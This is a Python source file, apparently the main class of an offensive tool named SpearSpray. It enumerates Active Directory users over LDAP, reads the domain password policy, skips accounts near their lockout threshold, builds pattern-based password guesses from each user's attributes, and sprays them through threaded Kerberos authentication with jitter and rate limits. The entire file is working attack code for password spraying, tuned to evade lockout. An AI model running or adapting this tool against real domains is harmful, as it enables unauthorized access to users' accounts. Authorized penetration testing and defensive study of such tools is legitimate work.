import logging
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Generator

from spearspray.utils.constants import GREEN, RED, YELLOW, BOLD, RESET
from spearspray.modules.variables import VariablesManager
from spearspray.modules.patterns import Patterns
from spearspray.modules.kerberos import Kerberos
from spearspray.utils.variables_utils import (
    register_variables,
    are_all_variables_registered,
    variable_resolver,
    get_used_variables
)
from spearspray.utils.ldap_utils import (
    connect_to_ldap,
    get_users_from_ldap,
    get_domain_password_policy,
    handle_domain_password_policy,
    filter_threshold_users,
    filter_pso_users
)

class SpearSpray:
    
    def __init__(self, args):

        self.log = logging.getLogger(__name__)

        # LDAP connection parameters
        self.domain = args.domain
        self.username = args.username
        self.password = args.password
        self.target = args.domain_controller
        self.query = args.query
        self.ssl = args.ssl
        self.ldap_page_size = args.ldap_page_size

        # Attack configuration
        self.threads = args.threads
        self.jitter = args.jitter
        self.max_rps = args.max_rps
        self.threshold = args.threshold

        # Pattern generation parameters
        self.extra = args.extra
        self.separator = args.separator
        self.suffix = args.suffix
        self.input_file = args.input

        # LDAP attributes to retrieve for each user (needed for pattern generation and PSO detection)
        self.fields = ["name", "sAMAccountName", "pwdLastSet", "whenCreated", "badPwdCount", "msDS-ResultantPSO"]

    def run(self):

        # Initialize variables and pattern management

        variables_instance = VariablesManager()
        register_variables(variables_instance)
        variables_registered = variables_instance.get_all()

        patterns_instance = Patterns(self.extra, self.input_file)
        patterns_detected = patterns_instance.read_patterns_file()

        are_all_variables_registered(patterns_detected, variables_registered)

        # LDAP enumeration and domain policy (and PSO) filtering
 
        ldap_instance, ldap_connection = connect_to_ldap(self.target, self.domain, self.username, self.password, self.ssl, self.ldap_page_size)

        domain_policy = get_domain_password_policy(ldap_instance, ldap_connection)
        handle_domain_password_policy(domain_policy)

        users_objects = get_users_from_ldap(ldap_instance, ldap_connection, self.query, self.fields)
        ldap_instance.close_connection(ldap_connection)
        users_objects = filter_pso_users(users_objects)
        users_objects = filter_threshold_users(users_objects, domain_policy, self.threshold)
        
        if len(users_objects) == 0:
            self.log.error(f"{RED}[-]{RESET} No users remaining after filtering. Exiting.")
            sys.exit(1)


        self.log.warning(f"{BOLD}{YELLOW}[*] Password spraying will be performed against {len(users_objects)} users.{RESET}")

        # Pattern selection and password generation setup
        selected_pattern = patterns_instance.create_dynamic_menu(patterns_detected)
        filtered_variables = get_used_variables(variables_registered, selected_pattern)

        # Execute password spraying attack
        kerberos_instance = Kerberos(domain=self.domain, kdc=self.target, jitter=self.jitter, max_rps=self.max_rps,)
        self.log.warning(f"{YELLOW}[*]{RESET} Starting password spraying against {len(users_objects)} users...")
        self._spray(kerberos_instance, users_objects, selected_pattern, filtered_variables)

    def _build_credentials(self, users_objects: list[dict], selected_pattern: str, filtered_variables: list[str]) -> Generator[Tuple[str, str], None, None]:

        for entry in users_objects: 
            
            # Extract username and generate password using the selected pattern
            
            user: str = entry.get("sAMAccountName")                
            password: str = variable_resolver(entry, selected_pattern, filtered_variables, self.extra, self.separator, self.suffix,)
                
            yield (user, password) # Return a tuple of (username, password) for each user

    def _spray(self, kerberos_instance: Kerberos, users_objects: List[dict], selected_pattern: str, filtered_variables: List[str]) -> None:

        # TODO: Implement estimated time remaining based on total users, threads, jitter and max requests per second
        # TODO: Consider implementing an interactive progress feature similar to Nmap (allow pressing Enter to display remaining spraying duration and current progress)
        # TODO: Add a results summary at the end of the spraying process

        total_users = len(users_objects)
        credentials = self._build_credentials(users_objects, selected_pattern, filtered_variables)
        completed = 0

        with ThreadPoolExecutor(max_workers=self.threads) as pool:

            # Launch initial authentication attempts in parallel
            active_tasks = {
                pool.submit(kerberos_instance.authenticate, *next(credentials))
                for _ in range(min(self.threads, total_users)) # Limit initial tasks to the number of threads or users remaining if total_users < threads
            }

            while active_tasks:
                for completed_task in as_completed(active_tasks):
                    active_tasks.remove(completed_task)
                    completed += 1

                    try:
                        completed_task.result()
                    except Exception:
                        self.log.exception(f"{RED}[-]{RESET} Exception during thread execution.")
                        raise

                    # Debug mode: Log progress every 10 or 100 completed tasks
                    if completed <= 10 or completed % 100 == 0:
                        self.log.debug(f"[*] Completed {completed}/{total_users} attempts")

                    try:
                        active_tasks.add(
                            pool.submit(kerberos_instance.authenticate, *next(credentials))
                        )
                    except StopIteration:
                        # No more credentials to process
                        break

        kerberos_instance.cleanup()
